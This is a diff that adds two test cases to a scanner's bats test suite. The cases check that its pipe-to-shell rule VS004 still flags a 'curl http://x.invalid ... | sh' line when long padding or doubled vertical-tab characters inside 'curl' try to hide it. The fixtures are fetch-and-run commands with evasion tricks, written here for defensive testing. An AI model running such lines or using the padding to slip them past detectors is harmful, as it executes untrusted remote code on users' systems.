@@ -611,3 +611,14 @@ assert truncated and len(files) == 1, (files, truncated)"
   run scan
   [ "$(echo "$output" | jq -r '[.findings[] | select(.rule=="VS004") | .path] | join(",")')" = "b.sh" ]
 }
+
+@test "a fetcher far from its pipe-to-shell tail on one long line is still VS004" {
+  { printf 'curl http://x.invalid/'; head -c 6000 /dev/zero | tr '\0' 'a'; printf ' | sh\n'; } > "$D/install.sh"
+  run scan
+  echo "$output" | jq -e '.findings[] | select(.rule=="VS004" and .path=="install.sh")' >/dev/null
+}
+@test "doubled separator characters inside a word on a long line still cannot hide it" {
+  { printf 'cu\x0b\x0brl http://x.invalid | sh'; head -c 5000 /dev/zero | tr '\0' ' '; printf '\n'; } > "$D/install.sh"
+  run scan
+  echo "$output" | jq -e '.findings[] | select(.rule=="VS004" and .path=="install.sh")' >/dev/null
+}
